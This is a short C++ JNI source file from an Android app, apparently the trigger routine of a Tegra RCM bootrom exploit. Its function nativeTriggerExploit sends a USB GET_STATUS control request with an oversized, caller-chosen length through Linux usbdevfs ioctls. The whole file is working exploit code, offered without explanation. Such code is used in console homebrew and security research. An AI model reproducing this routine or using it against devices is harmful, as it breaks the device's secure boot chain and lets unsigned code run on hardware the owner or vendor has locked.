#include <jni.h>
#include <cstdlib>
#include <sys/ioctl.h>
#include <linux/usbdevice_fs.h>
#include <linux/usb/ch9.h>
extern "C" JNIEXPORT jint JNICALL Java_com_magictupper_remote_RcmInjector_nativeTriggerExploit(JNIEnv*, jclass, jint fd, jint length) {
 const int total=(int)sizeof(usb_ctrlrequest)+length; void* buffer=calloc(1,total); if(!buffer)return -10;
 auto* req=(usb_ctrlrequest*)buffer; req->bRequestType=USB_DIR_IN|USB_RECIP_INTERFACE; req->bRequest=USB_REQ_GET_STATUS; req->wLength=(__le16)length;
 usbdevfs_urb* reaped=nullptr; usbdevfs_urb urb{}; urb.type=USBDEVFS_URB_TYPE_CONTROL; urb.endpoint=0; urb.buffer=buffer; urb.buffer_length=total; urb.usercontext=(void*)0x4d54;
 if(ioctl(fd,USBDEVFS_SUBMITURB,&urb)<0){free(buffer);return -1;} if(ioctl(fd,USBDEVFS_DISCARDURB,&urb)<0){free(buffer);return -2;} if(ioctl(fd,USBDEVFS_REAPURB,&reaped)<0){free(buffer);return -3;}
 int rc=(reaped&&reaped->usercontext==(void*)0x4d54)?0:-4; free(buffer); return rc;
}
